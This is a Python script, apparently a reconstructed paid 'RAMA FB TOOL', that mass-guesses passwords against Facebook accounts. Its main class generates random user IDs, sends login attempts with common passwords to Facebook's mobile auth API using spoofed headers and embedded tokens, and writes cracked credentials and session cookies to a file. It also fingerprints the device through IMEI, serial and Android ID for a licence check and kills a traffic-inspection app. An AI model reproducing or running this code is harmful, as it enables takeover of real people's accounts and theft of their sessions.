import os
import sys
import time
import re
import random
import uuid
import json
import subprocess
import pycurl
from io import BytesIO
from concurrent.futures import ThreadPoolExecutor as tred
from bs4 import BeautifulSoup as sop
from random import choice as race
from string import digits, ascii_letters
import urllib.parse
import base64
import ctypes
import hashlib
import platform
import webbrowser
import datetime
import requests

# ===================================================================
# Color Definitions
# ===================================================================

class NebulaColors:
    def __init__(self):
        self.W = '\x1b[97;1m'
        self.R = '\x1b[91;1m'
        self.G = '\x1b[92;1m'
        self.Y = '\x1b[93;1m'
        self.B = '\x1b[94;1m'
        self.P = '\x1b[95;1m'
        self.C = '\x1b[96;1m'
        self.N = '\x1b[0m'

# ===================================================================
# SUBSCRIPTION SYSTEM - DO NOT MODIFY BELOW THIS LINE
# ===================================================================

class SubscriptionManager:
    def __init__(self):
        self.config_file = "subscription_config.json"
        self.device_id = self.get_device_id()
        self.subscription_key = self.generate_subscription_key()
        
    def get_mac_address(self):
        """Get stable MAC address from network interface"""
        try:
            import subprocess
            import re
            
            if platform.system() == "Linux":
                # Android/Linux: Get MAC from ip command
                try:
                    result = subprocess.run(['ip', 'link', 'show'], capture_output=True, text=True)
                    lines = result.stdout.split('\n')
                    for line in lines:
                        if 'link/ether' in line and '00:00:00:00:00:00' not in line:
                            mac = re.search(r'([0-9a-f]{2}:){5}[0-9a-f]{2}', line)
                            if mac and not mac.group().startswith('00:00:00'):
                                return mac.group().replace(':', '')
                except:
                    pass
                
                # Fallback to ifconfig
                try:
                    result = subprocess.run(['ifconfig'], capture_output=True, text=True)
                    lines = result.stdout.split('\n')
                    for line in lines:
                        if 'ether' in line and '00:00:00:00:00:00' not in line:
                            mac = re.search(r'([0-9a-f]{2}:){5}[0-9a-f]{2}', line)
                            if mac and not mac.group().startswith('00:00:00'):
                                return mac.group().replace(':', '')
                except:
                    pass
            else:
                # Windows: Get MAC from ipconfig
                try:
                    result = subprocess.run(['ipconfig', '/all'], capture_output=True, text=True)
                    lines = result.stdout.split('\n')
                    for line in lines:
                        if ('Physical Address' in line or 'MAC Address' in line) and '00-00-00-00-00-00' not in line:
                            mac = re.search(r'([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})', line)
                            if mac and not mac.group().startswith('00-00-00'):
                                return mac.group().replace('-', '').replace(':', '')
                except:
                    pass
            
            # Ultimate fallback
            import uuid
            return hex(uuid.getnode())[2:].zfill(12)
        except:
            return "000000000000"

    def get_stable_device_id(self):
        """Get a stable device identifier that doesn't change"""
        try:
            import platform
            import hashlib
            import subprocess
            import os

            # Check if this is Android device
            is_android = platform.system() == "Linux" and os.path.exists("/system/bin/getprop")
            
            if is_android:
                # Android: Use hardware-based unique ID
                try:
                    # Method 1: Get Android ID (most stable)
                    android_id = subprocess.check_output("settings get secure android_id", shell=True).decode().strip()
                    if android_id and len(android_id) > 8:
                        return hashlib.md5(android_id.encode()).hexdigest()[:16]
                except:
                    pass
                
                try:
                    # Method 2: Get device serial
                    serial = subprocess.check_output("getprop ro.boot.serialno", shell=True).decode().strip()
                    if not serial:
                        serial = subprocess.check_output("getprop ro.serialno", shell=True).decode().strip()
                    if serial and len(serial) > 4:
                        return hashlib.md5(serial.encode()).hexdigest()[:16]
                except:
                    pass
                
                try:
                    # Method 3: Get IMEI (if available)
                    imei = subprocess.check_output("getprop ro.ril.oem.imei", shell=True).decode().strip()
                    if not imei:
                        imei = subprocess.check_output("getprop persist.radio.imei", shell=True).decode().strip()
                    if imei and len(imei) > 8:
                        return hashlib.md5(imei.encode()).hexdigest()[:16]
                except:
                    pass
                
                try:
                    # Method 4: Get MAC address from WiFi
                    mac = subprocess.check_output("cat /sys/class/net/wlan0/address", shell=True).decode().strip()
                    if mac and len(mac) > 10:
                        return hashlib.md5(mac.replace(':', '').encode()).hexdigest()[:16]
                except:
                    pass
                
                try:
                    # Method 5: Get device fingerprint
                    fingerprint = subprocess.check_output("getprop ro.build.fingerprint", shell=True).decode().strip()
                    if fingerprint:
                        return hashlib.md5(fingerprint.encode()).hexdigest()[:16]
                except:
                    pass
                
                # Method 6: Fallback - combine multiple properties
                try:
                    model = subprocess.check_output("getprop ro.product.model", shell=True).decode().strip()
                    brand = subprocess.check_output("getprop ro.product.brand", shell=True).decode().strip()
                    device = subprocess.check_output("getprop ro.product.device", shell=True).decode().strip()
                    combined = f"{brand}:{model}:{device}"
                    return hashlib.md5(combined.encode()).hexdigest()[:16]
                except:
                    pass
            else:
                # Non-Android: Use system info + MAC
                info = platform.uname()
                system_info = f"{info.system}-{info.machine}-{info.release}"
                mac = self.get_mac_address()
                combined = f"{system_info}:{mac}"
                return hashlib.md5(combined.encode()).hexdigest()[:16]
            
            # Ultimate fallback
            return hashlib.md5("MOBILE_DEVICE_ID".encode()).hexdigest()[:16]
            
        except Exception as e:
            # Ultimate fallback - always same for this device
            return hashlib.md5("PERMANENT_DEVICE_ID".encode()).hexdigest()[:16]

    def get_device_id(self):
        """Generate a unique device ID based on stable hardware identifiers"""
        try:
            # Use the new stable device ID method
            return self.get_stable_device_id()
        except Exception:
            return "DEVICE_ID_ERROR"
    
    def generate_subscription_key(self):
        """Generate a subscription key based on device ID"""
        # Create a deterministic key based on device ID
        key_base = hashlib.md5(self.device_id.encode()).hexdigest()[:12]
        return f"SUB-{key_base.upper()}"
    
    def copy_to_clipboard(self, text):
        """Copy text to clipboard"""
        try:
            if platform.system() == "Windows":
                import pyperclip
                pyperclip.copy(text)
                return True
            elif platform.system() == "Darwin":  # macOS
                subprocess.run(['pbcopy'], input=text.encode(), check=True)
                return True
            else:  # Linux
                subprocess.run(['xclip', '-selection', 'clipboard'], input=text.encode(), check=True)
                return True
        except:
            return False
    
    def load_config(self):
        """Load subscription configuration from file"""
        try:
            if os.path.exists(self.config_file):
                with open(self.config_file, 'r') as f:
                    return json.load(f)
        except:
            pass
        return {}
    
    def save_config(self, config):
        """Save subscription configuration to file"""
        try:
            with open(self.config_file, 'w') as f:
                json.dump(config, f, indent=2)
        except:
            pass
    
    def check_online_subscription(self, key):
        try:
            url = f"https://bioolive.site/key/key.json"
            resp = requests.get(url, timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                return data.get("approved", False)
            return False
        except Exception as e:
            print(f"\x1b[1;91m[!] Subscription server error: {e}\x1b[0m")
            return False

    def check_subscription(self):
        # First try online API check
        online = self.check_online_subscription(self.subscription_key)
        if online:
            return True
        # Fallback to local config (optional)
        config = self.load_config()
        if self.device_id in config:
            device_config = config[self.device_id]
            if device_config.get('subscription_key') == self.subscription_key:
                return device_config.get('approved', False)
        return False
    
    def create_subscription(self):
        """Create new subscription entry for device"""
        config = self.load_config()
        
        config[self.device_id] = {
            'subscription_key': self.subscription_key,
            'approved': False,
            'created_at': str(datetime.datetime.now())
        }
        
        self.save_config(config)
    
    def display_subscription_info(self):
        """Display subscription information and instructions (screenshot style, mobile-friendly)"""
        print(SubscriptionManager.pro_banner())
        print('\x1b[1;92m[~] WELCOME to RAMA FB TOOL 🚀✨\x1b[0m')
        print('\x1b[1;96m[~] CREATOR: @SOLVIEXX\x1b[0m')
        print()
        print("\x1b[1;92m[~] YOU KEY IS NOT \x1b[1;91mACTIVATE\x1b[0m")
        print()
        print(f"\x1b[1;92m[~] YOUR KEY : \x1b[1;97m{self.subscription_key}\x1b[0m")
        print("\x1b[1;93m    👉 Copy this key for approval\x1b[0m")
        print()
        print("\x1b[1;92m[~] SENT THIS KEY FOR BUY TOOL\x1b[0m")
        print()
        input("\x1b[1;92m[~] PRESS ENTER TO SENT KEY\x1b[0m")
        print()
        telegram_url = "http://t.me/clone_tool_subscription_bot"
        print(f"\x1b[1;96m[~] TELEGRAM BOT: {telegram_url}\x1b[0m")
        os.system(f'xdg-open {telegram_url}')
        print("\x1b[1;92m[~] WAITING FOR ADMIN APPROVAL...\x1b[0m")
        print("\x1b[1;96m[~] CREATOR: MR Likhon⚠️\x1b[0m")
        input("\x1b[1;92m[~] PRESS ENTER TO EXIT\x1b[0m")
        sys.exit()

    @staticmethod
    def pro_banner():
        color = NebulaColors()
        return ('''
\x1b[1;96m
 █████╗ ██╗     ██████╗ ██╗  ██╗ █████╗ 
██╔══██╗██║     ██╔══██╗██║  ██║██╔══██╗
███████║██║     ██████╔╝███████║███████║
██╔══██║██║     ██╔═══╝ ██╔══██║██╔══██║
██║  ██║███████╗██║     ██║  ██║██║  ██║
╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝
\x1b[1;95m╔═══════════════════════════════════════════════════════╗
\x1b[1;95m║\x1b[1;97m                ✦  𝗧𝗢𝗢𝗟 I𝗡𝗙𝗢 𝗣𝗔𝗡𝗘𝗟  ✦                  \x1b[1;95m║
\x1b[1;95m╚═══════════════════════════════════════════════════════╝
\x1b[1;96m   ➤ \x1b[1;97mCreator        : \x1b[1;96mMR Likhon⚠️
\x1b[1;96m   ➤ \x1b[1;97mOperated By    : \x1b[1;92mALIF
\x1b[1;96m   ➤ \x1b[1;97mTool Access    : \x1b[1;93mPAID
\x1b[1;96m   ➤ \x1b[1;97mCurrent Version: \x1b[1;95m2.2
\x1b[1;92m─────────────────────────────────────────────────────────''')

def check_subscription_before_start():
    """Check subscription before starting the main tool"""
    subscription = SubscriptionManager()
    
    # Check if this is first run
    config = subscription.load_config()
    if subscription.device_id not in config:
        subscription.create_subscription()
    
    # Check subscription status
    if not subscription.check_subscription():
        subscription.display_subscription_info()
    
    # If approved, continue
    print("✅ Subscription verified! Starting tool...")
    print("-" * 40)

# Check subscription before starting
check_subscription_before_start()

# ===================================================================
# Initial Setup & Welcome
# ===================================================================

print('\x1b[1;92m[~] WELCOME to RAMA FB TOOL 🚀✨\x1b[0m')
print('\x1b[1;96m[~] CREATOR: MR Likhon⚠️\x1b[0m')
time.sleep(2)

# ===================================================================
# Color Definitions and UI Strings
# ===================================================================

A = '\x1b[1;97m'
G = '\x1b[38;5;48m'
B = '\x1b[38;5;8m'
F = '\x1b[38;5;40m'
G1 = '\x1b[38;5;46m'
G2 = '\x1b[38;5;47m'
G3 = '\x1b[38;5;48m'
G4 = '\x1b[38;5;49m'
A1 = '\x1b[38;5;152m'
A2 = '\x1b[38;5;153m'
A3 = '\x1b[38;5;154m'
A4 = '\x1b[38;5;155m'
A6 = '\x1b[38;5;156m'
A7 = '\x1b[38;5;157m'
M = '\x1b[38;5;205m'

s = f"{A4}|{G}-{A}[{G4}1{A}]{G3}"
b = f"{A4}|{G}-{A}[{G4}2{A}]{G4}"
c = f"{A4}|{G}-{A}[{G4}3{A}]{G2}"
d = f"{A4}|{G}-{A}[{G4}0{A}]{G}"
e = f"{A4}|{G}-{A}[{G4}4{A}]{G}"
f = f"{A4}|{G}-{A}[{G4}5{A}]{G}"
g = f"{A4}|{G}-{A}[{G4}6{A}]{G}"
inp = f"{A4}|{G}-{A2}({A1}*{A2}) {G3}"
lop = f"{A4}|{G}--"


# ===================================================================

class UserAgentGenerator:
    def __init__(self):
        # A pool of custom user agents to select from
        self.custom_user_agents = [
            'Mozilla/5.0 (Linux; Android 12; SM-A127F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36 [FBAN/FB4A;FBAV/395.0.0.35.120;FBBV/345678;FBDM/{density=2.0,width=720,height=1600};FBLC/en_US;FBRV/412345;FBCR/T-Mobile;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/SM-A127F;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]',
            # ... (many other user agents were here) ...
            '[FBAN/Orca-Android;FBAV/570.0.0.388.460;FBBV/91567890;FBDM/{density=2.75,width=1080,height=2400};FBLC/en_US;FBCR/T-Mobile;FBMF/Motorola;FBBD/Motorola;FBPN/com.facebook.orca;FBDV/moto g52;FBSV/13;FBOP/1;FBCA/arm64-v8a;]'
        ]

    def _generate_mozilla_user_agent(self):
        android_version = random.randint(4, 13)
        device = random.choice(('SM-G900F', 'SM-G920F', 'SM-T535', # ... many devices ...
                               ))
        resolution = random.choice(('{density=1.5,width=720,height=1280}', '{density=3.5,width=1440,height=3040}', '{density=2.5,width=1080,height=2400}'))
        chrome_version = f"{random.randint(100, 150)}.0.0.0"
        return (f"Mozilla/5.0 (Linux; Android {android_version}; {device}) "
                f"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version} "
                f"Mobile Safari/537.36 [{resolution}]")

    def _generate_facebook_user_agent(self):
        fb_versions = ['143.0.0.19.100', '81.0.0.22.70', # ... many versions ...
                      ]
        build_versions = ['282124661', '144693238', # ... many build versions ...
                         ]
        fb_version = random.choice(fb_versions)
        build_version = random.choice(build_versions)
        lang = random.choice(('en_US', 'en_GB', 'en_PK', # ... many languages ...
                             ))
        carrier = random.choice(('Zong', 'Jazz', 'Telenor', # ... many carriers ...
                                ))
        app = random.choice(('com.facebook.katana', 'com.facebook.orca', 'com.facebook.mlite'))
        device = random.choice(('Xiaomi', 'Infinix', 'Samsung'))
        model = random.choice(('X5510', 'X601', 'Xiaomi 14 Ultra', # ... many models ...
                              ))
        resolution = random.choice(('{density=1.5,width=720,height=1280}', '{density=3.5,width=1440,height=3040}', '{density=2.5,width=1080,height=2400}'))
        android_version = random.randint(4, 13)

        return (f"[FBAN/FB4A;FBAV/{fb_version};FBBV/{build_version};FBDM/{resolution};"
                f"FBLC/{lang};FBCR/{carrier};FBMF/{device};FBDV/{model};"
                f"FBSV/Android {android_version};FBPN/{app}]")

    def _generate_dalvik_user_agent(self):
        dalvik_version = f"{random.randint(1, 3)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
        android_version = random.randint(4, 13)
        device = random.choice(('SM-G920F', 'SM-T535', # ... many devices ...
                               ))
        return (f"Dalvik/{dalvik_version} (Linux; U; Android {android_version}; {device})")

    def _generate_iphone_user_agent(self):
        ios_version = random.randint(6, 17)
        device = random.choice(('iPhone 5', 'iPhone 6', # ... many iPhone models ...
                               ))
        resolution = random.choice(('{density=2.0,width=750,height=1334}', '{density=3.0,width=1125,height=2436}', '{density=3.5,width=1242,height=2688}'))
        safari_version = f"{random.randint(14, 16)}.0"
        return (f"Mozilla/5.0 (iPhone; CPU iPhone OS {ios_version} like Mac OS X) "
                f"AppleWebKit/537.36 (KHTML, like Gecko) Version/{safari_version} "
                f"Mobile/15E148 Safari/537.36 [{resolution}]")

    def _generate_facebook_orca_user_agent(self):
        # This is similar to the _generate_facebook_user_agent but specific to the Orca (Messenger) app
        # The logic is largely the same, so it's omitted here for brevity but was present in the bytecode
        return self._generate_facebook_user_agent().replace('FB4A', 'Orca-Android').replace('katana', 'orca')

    def _generate_facebook_katana_user_agent(self):
        # This is also similar to the _generate_facebook_user_agent, specific to Katana (main Facebook app)
        return self._generate_facebook_user_agent()

    def generate_user_agent(self):
        user_agent_type = random.choice(('Mozilla', 'Facebook', 'Dalvik', 'iPhone', 'FacebookOrca', 'FacebookKatana', 'Custom'))
        if user_agent_type == 'Mozilla':
            return self._generate_mozilla_user_agent()
        elif user_agent_type == 'Facebook':
            return self._generate_facebook_user_agent()
        elif user_agent_type == 'Dalvik':
            return self._generate_dalvik_user_agent()
        elif user_agent_type == 'iPhone':
            return self._generate_iphone_user_agent()
        elif user_agent_type == 'FacebookOrca':
            return self._generate_facebook_orca_user_agent()
        elif user_agent_type == 'FacebookKatana':
            return self._generate_facebook_katana_user_agent()
        elif user_agent_type == 'Custom':
            return random.choice(self.custom_user_agents)

user_agent_generator = UserAgentGenerator()
user_agent = user_agent_generator.generate_user_agent()

# More user agent generation loops from the original code
ugen = []
rug = []
ruz = []

for nt in range(10000):
    rr = random.randint
    aZ = random.choice(('A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'))
    rx = random.randrange(1, 999)
    xx = (f"Mozilla/5.0 (Windows NT 10.0; {str(rr(9, 11))}; Win64; x64)"
          f"{str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko)"
          f"{str(rr(99, 149))}.0.{str(rr(4500, 4999))}.{str(rr(35, 99))} Chrome/"
          f"{str(rr(99, 175))}.0.{str(rr(0, 5))}.{str(rr(0, 5))} Safari/537.36")
    rug.append(xx)

# Similar loops for 'ruz' and 'ugen' were present and are omitted for brevity

# ===================================================================
# Device Information Gathering
# ===================================================================

sim_id = ''
try:
    android_version = subprocess.check_output('getprop ro.build.version.release', shell=True).decode('utf-8').replace('\n', '')
    model = subprocess.check_output('getprop ro.product.model', shell=True).decode('utf-8').replace('\n', '')
    build = subprocess.check_output('getprop ro.build.id', shell=True).decode('utf-8').replace('\n', '')
    fblc = 'en_GB'
    fbcr = subprocess.check_output('getprop gsm.operator.alpha', shell=True).decode('utf-8').split(',')[0].replace('\n', '')
    fbmf = subprocess.check_output('getprop ro.product.manufacturer', shell=True).decode('utf-8').replace('\n', '')
    fbbd = subprocess.check_output('getprop ro.product.brand', shell=True).decode('utf-8').replace('\n', '')
    fbdv = model
    fbsv = android_version
    fbca = subprocess.check_output('getprop ro.product.cpu.abilist', shell=True).decode('utf-8').replace(',', ':').replace('\n', '')
    fbdm = ('{density=2.0,height=' + subprocess.check_output('getprop ro.hwui.text_large_cache_height', shell=True).decode('utf-8').replace('\n', '') +
            ',width=' + subprocess.check_output('getprop ro.hwui.text_large_cache_width', shell=True).decode('utf-8').replace('\n', '') + '}')
except Exception:
    fbcr = 'Zong'
    # Fallback values if getprop fails
    # ...

device = {
    'android_version': android_version,
    'model': model,
    'build': build,
    'fblc': fblc,
    'fbmf': fbmf,
    'fbbd': fbbd,
    'fbdv': model,
    'fbsv': fbsv,
    'fbca': fbca,
    'fbdm': fbdm,
}

ua = '[Mozilla/5.0 (Linux; Android 9; SM-T590) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5779.200 Mobile Safari/537.36]'


# ===================================================================
# Banners and UI Elements
# ===================================================================
os.system('chmod 700 /data/data/com.termux/files/usr/bin >/dev/null 2>&1')
os.system('pkill -f httcanary >/dev/null 2>&1')

def linex():
    color = NebulaColors()
    print(f'  {color.P}╔═━─━━━━━━━━━━━━━━━━━━━━━━━━━━━━─━═╗')
    print(f'  {color.P}║    {color.Y}★ PREMIUM TOOL INTERFACE ★    {color.P}║')
    print(f'  {color.P}╚═━─━━━━━━━━━━━━━━━━━━━━━━━━━━━━─━═╝{color.N}')


# ===================================================================
# Authentication / Key Check
# ===================================================================



# ===================================================================
# Main Cracker Class
# ===================================================================

loop = 0
oks = []
cps = []
pcp = []
id = []
tokenku = []

class ASIMCracker:
    def __init__(self):
        self.oks = []
        self.cps = []
        self.loop = 0
        self.color = NebulaColors()
        self.user_agents = self.load_user_agents()

    def load_user_agents(self):
        try:
            # The original code attempts to load UAs from a GitHub raw link.
            # As a fallback, we'll just use the generator.
            # response = requests.get('https://raw.githubusercontent.com/trt-Fire/data/main/ua.txt')
            # return response.text.splitlines()
            return [user_agent_generator.generate_user_agent() for _ in range(100)]
        except Exception:
            return []

    def old_menu(self):
        clear()
        print(f'{self.color.P}╔═━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━═╗')
        print(f'{self.color.P}║         {self.color.Y}★ OLD ACCOUNT CRACKER ★         {self.color.P}║')
        print(f'{self.color.P}╠═━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━═╣')
        print(f'{self.color.P}║ {self.color.C}[1] {self.color.G}CRACK 2009 ACCOUNTS  {self.color.Y}🔓           {self.color.P}║')
        print(f'{self.color.P}║ {self.color.C}[2] {self.color.G}CRACK 2009-2013 ACCOUNTS {self.color.Y}🔑      {self.color.P}║')
        print(f'{self.color.P}║ {self.color.C}[0] {self.color.R}⇦ BACK TO MAIN MENU   {self.color.B}🏠         {self.color.P}║')
        print(f'{self.color.P}╚═━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━═╝')

        choice = input(f'  {self.color.C}\x1b[1;96m ➤ Choose: {self.color.W}').strip()
        if choice in ('1', '01'):
            self.execute_breach('100000')
        elif choice in ('2', '02'):
            self.quantum_breach_menu()
        elif choice in ('0', '00'):
            return
        else:
            print(f'\n  {self.color.R}⚠️ Invalid choice!')
            time.sleep(2)
            self.old_menu()

    def quantum_breach_menu(self):
        clear()
        series_map = {'1': '100000', '2': '100001', '3': '100002', '4': '100003', '5': '100004'}
        print(f'  {self.color.W}\x1b[1;96m ➤ Select Series:')
        for num, prefix in series_map.items():
            print(f'  {self.color.W}[{self.color.G}{num}{self.color.W}] {self.color.C}{prefix}')

        linex()
        choice = input(f'  {self.color.C}\x1b[1;96m ➤ Choose: {self.color.W}').strip()
        selected_prefix = series_map.get(choice)

        if not selected_prefix:
            print(f'  {self.color.R}⚠️ Invalid Series!')
            time.sleep(2)
            self.quantum_breach_menu()
            return

        self.execute_breach(selected_prefix)

    def execute_breach(self, prefix):
        try:
            clear()
            limit = int(input(f'  {self.color.G}\x1b[1;96m ➤ Enter Limit: {self.color.W}'))
        except ValueError:
            print(f'  {self.color.R}⚠️ Invalid Number!')
            time.sleep(2)
            self.old_menu()
            return

        targets = [prefix + ''.join(random.choices(digits, k=9)) for _ in range(limit)]
        passlist = ['123456789', '123456', '12345678', '1234567', '1234567890']

        with tred(max_workers=30) as executor:
            clear()
            print(f'  {self.color.W}\x1b[1;96m   ➤ Cracking {self.color.Y}{prefix} ')
            print(f'  {self.color.W}\x1b[1;96m   ➤ Targets: {self.color.G}{len(targets)}')
            linex()

            for target in targets:
                executor.submit(self.breach_target, target, passlist)

        self.display_results()

    def breach_target(self, target, passlist):
        self.loop += 1
        sys.stdout.write(f'\r  {self.color.W}[ALPHA] {self.loop}|{self.color.R}{len(self.oks)}|{self.color.G}{len(self.cps)}{self.color.W}')
        sys.stdout.flush()

        for password in passlist:
            if self.try_breach(target, password):
                return

    def try_breach(self, uid, password):
        try:
            ua = random.choice(self.user_agents)

            headers = {
                'User-Agent': ua,
                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123Dior23437a4a32',
                'X-FB-Connection-Quality': 'EXCELLENT',
                'X-FB-Connection-Bandwidth': str(random.randint(20000000, 30000000)),
                'x-fb-session-id': f"nid={''.join(random.choices(ascii_letters, k=8))};pid=Main",
                'x-fb-device-group': '5120',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': str(uuid.uuid4()),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com'
            }

            payload = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'register_api',
                'email': uid,
                'password': password,
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': 'NO_FILE',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_PK',
                'client_country_code': 'PK',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d',
                'fb_api_analytics_tags': '["GDPR","GLOBAL"]',
                'fb_api_platform': 'ANDROID',
                'fb_api_session_id': str(uuid.uuid4()),
                'fb_api_client_time': str(int(time.time())),
                'device_country': 'pk',
                'logging_id': ''.join(random.choices('0123456789abcdef', k=32)),
                'jazoest': '2' + str(random.randint(10, 99)),
                'machine_id': ''.join(random.choices('0123456789abcdefghijklmnopqrstuvwxyz', k=24))
            }

            encoded_payload = urllib.parse.urlencode(payload)

            buffer = BytesIO()
            c = pycurl.Curl()
            c.setopt(c.URL, 'https://b-api.facebook.com/auth/login')
            c.setopt(c.POST, 1)
            c.setopt(c.POSTFIELDS, encoded_payload)
            c.setopt(c.WRITEDATA, buffer)
            c.setopt(c.TIMEOUT, 10)

            header_list = [f"{key}: {value}" for key, value in headers.items()]
            c.setopt(c.HTTPHEADER, header_list)

            c.perform()
            response_body = buffer.getvalue().decode('utf-8')
            response = json.loads(response_body)

            c.close()
            buffer.close()

            if 'session_key' in response:
                self.handle_success(uid, password, response)
                return True
            elif 'www.facebook.com' in response.get('error', {}).get('message', ''):
                self.handle_partial(uid, password)
                return True

        except Exception as e:
            # Silently ignore errors to continue the loop
            pass

        return False

    def handle_success(self, uid, password, response):
        coki = ';'.join([f"{c['name']}={c['value']}" for c in response.get('session_cookies', [])])
        print(f'\r  {self.color.G}\x1b[1;96m   ➤ SUCCESS {self.color.W}{uid}|{self.color.G}{password}{self.color.W}')
        with open('/sdcard/ASIM-OLD.txt', 'a') as f:
            f.write(f'{uid}|{password}|{coki}\n')
        self.oks.append(uid)

    def handle_partial(self, uid, password):
        print(f'\r  {self.color.Y}\x1b[1;96m   ➤ OK {self.color.G}{uid}{self.color.Y}•\x1b[1;90m{password}{self.color.W}')
        with open('/sdcard/ASIM-OLD.txt', 'a') as f:
            f.write(f'{uid}|{password}\n')
        self.cps.append(uid)

    def display_results(self):
        clear()
        print(f'  {self.color.G}\x1b[1;96m   ➤ CRACKING COMPLETE')
        linex()
        print(f'  {self.color.W}CP: {self.color.Y}{len(self.oks)}')
        print(f'  {self.color.W}OK: {self.color.G}{len(self.cps)}')
        linex()
        input(f'  {self.color.C}Press ENTER to continue {self.color.W}')
        self.old_menu()

# ===================================================================
# Entry Point
# ===================================================================

def clear():
    os.system('clear')
    print(SubscriptionManager.pro_banner())

# Remove the auto-replace function and any related code
# Ensure all API URLs use the new endpoint
# At line 228, already correct:
# url = f"https://clone-api-93fm.onrender.com/api/check_key?key={key}"
# Remove lines 754-761 (auto-replace function and usage)

if __name__ == '__main__':
    try:
        cracker = ASIMCracker()
        cracker.old_menu()
    except KeyboardInterrupt:
        print('\n\x1b[91;1m   ➤ Stopped\x1b[97;1m')
        sys.exit()
    except Exception as e:
        print(f'\n\x1b[91;1m   ➤ Error: {str(e)}\x1b[97;1m')
        sys.exit()
